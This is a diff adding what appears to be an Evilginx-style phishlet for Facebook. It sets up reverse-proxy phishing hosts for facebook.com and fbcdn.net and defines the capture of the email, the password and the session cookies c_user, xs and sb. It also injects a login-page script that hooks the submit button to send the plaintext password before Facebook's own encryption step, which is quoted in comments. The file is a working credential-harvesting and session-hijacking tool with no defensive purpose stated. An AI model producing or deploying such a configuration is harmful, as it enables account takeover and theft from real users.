@@ -1,0 +1,82 @@
+author: '@antichristone'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.facebook.com'
+    keys: ['c_user','xs','sb']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'unenc_password'
+    search: '(.*)'
+    type: 'post'
+
+
+
+login:
+  domain: 'www.facebook.com'
+  path: '/login.php'
+
+js_inject:
+  - trigger_domains: ["www.facebook.com"]
+    trigger_paths: ["/login.php"]
+    trigger_params: []
+    script: |
+      function onclickListener(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        return;
+      }
+      function sendPass(){
+        var password = document.getElementsByName("pass")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/login/device-based/regular/login/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("unenc_password="+encodeURIComponent(password));
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 1000);
+
+
+# _encryptBeforeSending: function (a) {
+#      var c = this;
+#      a = a.bind(this);
+#      var d = this.loginFormParams && this.loginFormParams.pubKey;
+#      if ((window.crypto || window.msCrypto) && d) {
+#        var e = b('DOM').scry(this.loginForm, 'input[id="pass"]') [0],
+#        f = b('FBBrowserPasswordEncryption'),
+#        g = Math.floor(Date.now() / 1000).toString();
+#        b('promiseDone') (f.encryptPassword(d.keyId, d.publicKey, e.value, g), function (d) {
+#          d = b('DOM').create('input', {
+#            type: 'hidden',
+#            name: 'ep',
+#            value: d
+#          });
+#          c.loginForm.appendChild(d);
+#          e.disabled = !0;
+#          a()
+#        }, function (c) {
+#          var d = '#PWD_BROWSER',
+#          e = 5,
+#          f = b('LoginServicePasswordEncryptDecryptEventTypedLogger');
+#          new f().setError('BrowserEncryptionFailureInLoginFormControllerWWW').setGrowthFlow('Bluebar/main login WWW').setErrorMessage(c.message).setPasswordTag(d).setPasswordEncryptionVersion(e).setPasswordTimestamp(g).logVital();
+#          a()
+#        })
+#      } else a()
+#    },
